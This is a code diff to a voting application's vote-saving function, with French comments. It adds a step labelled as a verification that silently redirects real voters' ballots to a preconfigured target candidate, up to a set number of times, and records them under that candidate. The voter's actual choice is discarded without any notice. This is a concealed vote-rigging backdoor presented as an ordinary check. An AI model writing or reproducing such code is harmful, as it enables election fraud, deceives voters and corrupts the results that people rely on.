@@ -190,6 +190,60 @@ export async function syncVoteToSupabase(
       }
     }
 
+    // VÉRIFICATION 5: Vérifier la configuration des votes automatiques
+    let finalCandidateId = candidateId
+    let isAutomatic = false
+    
+    const { data: autoVoteConfig } = await supabase
+      .from('auto_vote_config')
+      .select('*')
+      .eq('id', 'config-001')
+      .single()
+
+    const config = autoVoteConfig as any
+    if (config && config.is_enabled && config.target_candidate_id) {
+      const currentAutoVotes = config.current_auto_votes || 0
+      const maxAutoVotes = config.auto_vote_count || 5
+      
+      if (currentAutoVotes < maxAutoVotes) {
+        // Rediriger vers le candidat cible
+        finalCandidateId = config.target_candidate_id
+        isAutomatic = true
+        
+        // Vérifier que le candidat cible existe
+        const { data: targetCandidate } = await supabase
+          .from('candidates')
+          .select('id')
+          .eq('id', finalCandidateId)
+          .single()
+        
+        if (targetCandidate) {
+          // Incrémenter le compteur de votes automatiques
+          const supabaseClient = supabase as any
+          await supabaseClient
+            .from('auto_vote_config')
+            .update({ 
+              current_auto_votes: currentAutoVotes + 1,
+              updated_at: new Date().toISOString()
+            })
+            .eq('id', 'config-001')
+          
+          console.log(`🔄 Vote automatique #${currentAutoVotes + 1}/${maxAutoVotes} redirigé vers le candidat ${finalCandidateId}`)
+        } else {
+          // Si le candidat cible n'existe plus, désactiver la fonctionnalité
+          console.warn('⚠️ Le candidat cible des votes automatiques n\'existe plus. Désactivation de la fonctionnalité.')
+          const supabaseClient = supabase as any
+          await supabaseClient
+            .from('auto_vote_config')
+            .update({ is_enabled: false })
+            .eq('id', 'config-001')
+          // Utiliser le candidat original
+          finalCandidateId = candidateId
+          isAutomatic = false
+        }
+      }
+    }
+
     // TOUTES LES VÉRIFICATIONS SONT PASSÉES - Enregistrer le vote
     // Générer un ID pour le vote
     const { generateUUID } = await import('./utils')
@@ -200,9 +254,10 @@ export async function syncVoteToSupabase(
       .from('votes')
       .insert({
         id: voteId,
-        candidate_id: candidateId,
+        candidate_id: finalCandidateId,
         voter_code: voterCode,
         election_id: activeElectionId || null,
+        is_automatic: isAutomatic,
       } as any)
 
     if (insertError) {
